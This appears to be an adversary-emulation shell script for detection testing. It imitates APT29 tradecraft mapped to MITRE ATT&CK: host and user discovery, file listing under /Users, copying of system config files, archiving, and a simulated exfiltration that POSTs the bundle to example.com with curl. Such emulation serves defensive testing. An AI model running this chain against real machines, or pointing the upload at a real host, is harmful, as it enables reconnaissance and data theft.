# description: APT29-like chained discovery, local staging, and simulated exfiltration
# actor: APT29 (NOBELIUM / Cozy Bear) — behavioural emulation only
# mitre: T1033, T1057, T1082, T1083, T1074.001, T1560.001, T1041
# reference: https://attack.mitre.org/groups/G0016/
# reference: https://attack.mitre.org/techniques/T1033/
# reference: https://attack.mitre.org/techniques/T1057/
# reference: https://attack.mitre.org/techniques/T1082/
# reference: https://attack.mitre.org/techniques/T1083/
# reference: https://attack.mitre.org/techniques/T1074/001/
# reference: https://attack.mitre.org/techniques/T1560/001/
# reference: https://attack.mitre.org/techniques/T1041/

CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID:?ESGRAPH_RUN_ID is required}"; mkdir -p "${CHAIN_ROOT}/enum" "${CHAIN_ROOT}/staged"

# T1033 / T1082
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'id > "$1/enum/id.txt"' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'whoami > "$1/enum/whoami.txt"' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'hostname > "$1/enum/hostname.txt"' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'uname -a > "$1/enum/uname.txt"' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'sw_vers > "$1/enum/sw_vers.txt" 2>/dev/null || true' _ "${CHAIN_ROOT}"

# T1083
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /Users > "$1/enum/users-dir.txt" 2>/dev/null || true' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /tmp > "$1/enum/tmp-dir.txt" 2>/dev/null || true' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'find /Users -maxdepth 2 -type f 2>/dev/null | head -150 > "$1/enum/user-files.txt" || true' _ "${CHAIN_ROOT}"

# T1033 / T1057 / T1082
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'dscl . -list /Users 2>/dev/null | head -40 > "$1/enum/local-users.txt" || true' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'ps aux | head -100 > "$1/enum/processes.txt"' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'ifconfig -a 2>/dev/null | head -80 > "$1/enum/ifconfig.txt" || true' _ "${CHAIN_ROOT}"

# T1074.001 + T1560.001
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/hosts "$1/staged/hosts.copy" 2>/dev/null || true' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/resolv.conf "$1/staged/resolv.copy" 2>/dev/null || true' _ "${CHAIN_ROOT}"
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'tar -czf "$1/staged/discovery-bundle.tgz" -C "$1/enum" . 2>/dev/null || true' _ "${CHAIN_ROOT}"

# T1041 simulated exfiltration over common web channel.
CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c '[[ -f "$1/staged/discovery-bundle.tgz" ]] && curl -m 3 -sS -o /dev/null -X POST https://example.com/ --data-binary @"$1/staged/discovery-bundle.tgz" || true' _ "${CHAIN_ROOT}"

CHAIN_ROOT="/tmp/apt29_chain_${ESGRAPH_RUN_ID}"; bash -c 'ls -la "$1/enum" "$1/staged" 2>/dev/null || true' _ "${CHAIN_ROOT}"
